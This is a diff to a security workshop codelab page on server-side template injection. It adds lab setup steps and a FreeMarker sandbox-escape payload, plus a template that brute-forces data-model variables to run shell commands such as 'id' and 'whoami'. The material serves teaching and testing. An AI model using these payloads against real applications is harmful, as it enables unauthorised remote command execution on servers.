@@ -53,6 +53,17 @@
 </ul>
 <aside class="warning"><p>If you only have a web browser, you won&#39;t be able to reproduce the steps provided. You can still follow the workshop by reading the content and watch the demonstrations.</p>
 </aside>
+<h2 is-upgraded>Running the applications</h2>
+<p>In order to do the exercise, you will need to run the <a href="https://github.com/GoSecure/template-injection-workshop" target="_blank">lab applications</a> by yourself. All applications were built with a docker container recipe. This should make the deployment easier.</p>
+<ol type="1">
+<li>Download the code.<pre><code>git clone https://github.com/GoSecure/template-injection-workshop
+</code></pre>
+</li>
+<li>Read build instructions (<code>%application_dir%/README.md</code>) This step will differ for each application.</li>
+<li>Use docker-compose to start the application.<pre><code>docker-compose up
+</code></pre>
+</li>
+</ol>
 
 
       </google-codelab-step>
@@ -390,12 +401,35 @@ ${bytes[2]}
 <aside class="special"><p>Keep in mind that the bytes are printed in decimal format.</p>
 </aside>
 <h3 is-upgraded>Universal method</h3>
-<p>Oleksandr Mirosh and Alvaro Muñoz are detailing in their paper Room for Escape various chains that are specific to web containers. These containers are Tomcat, Jetty, GlassFish, WebLogic and WebSphere. These are a great source of inspiration if you are looking to escape the sandbox other than Freemarker. However if your objective is to exploit the current template engine, there is a universal payload that will work on Freemarker 2.3.29 and lower (Fixed in March 2020).</p>
-<pre><code>&lt;#assign classloader=object.class.protectionDomain.classLoader&gt;
+<p>Oleksandr Mirosh and Alvaro Muñoz are detailing in their paper Room for Escape various chains that are specific to web containers. These containers are Tomcat, Jetty, GlassFish, WebLogic and WebSphere. These are a great source of inspiration if you are looking to escape the sandbox other than Freemarker.</p>
+<p>However if your objective is to exploit the current template engine, there is a universal payload (also from the same paper) that will work on Freemarker 2.3.29 and lower (Fixed in March 2020). You need to find a variable in the data model that is an object.</p>
+<pre><code>&lt;#assign classloader=&lt;&lt;object&gt;&gt;.class.protectionDomain.classLoader&gt;
 &lt;#assign owc=classloader.loadClass(&#34;freemarker.template.ObjectWrapper&#34;)&gt;
 &lt;#assign dwf=owc.getField(&#34;DEFAULT_WRAPPER&#34;).get(null)&gt;
 &lt;#assign ec=classloader.loadClass(&#34;freemarker.template.utility.Execute&#34;)&gt;
 ${dwf.newInstance(ec,null)(&#34;whoami&#34;)}
+</code></pre>
+<p>Here is a template that will brute force all of the variables from the data model.</p>
+<pre><code>&lt;#list .data_model as key, object_test&gt;
+
+&lt;b&gt;Testing &#34;${key}&#34;:&lt;/b&gt;&lt;br/&gt;
+&lt;#attempt&gt;
+
+&lt;#assign classloader=object_test.class.protectionDomain.classLoader&gt;
+&lt;#assign owc=classloader.loadClass(&#34;freemarker.template.ObjectWrapper&#34;)&gt;
+&lt;#assign dwf=owc.getField(&#34;DEFAULT_WRAPPER&#34;).get(null)&gt;
+&lt;#assign ec=classloader.loadClass(&#34;freemarker.template.utility.Execute&#34;)&gt;
+
+Shell ! ( 
+${dwf.newInstance(ec,null)(&#34;id&#34;)}
+)
+
+&lt;#recover&gt;
+failed
+&lt;/#attempt&gt;
+
+&lt;br/&gt;&lt;br/&gt;
+&lt;/#list&gt;
 </code></pre>
 <h2 is-upgraded>Workshop exercise</h2>
 <p>For this exercise, connect to the web server <a href="http://template-injection.gosec.co:8026/" target="_blank">http://template-injection.gosec.co:8026/</a>.</p>
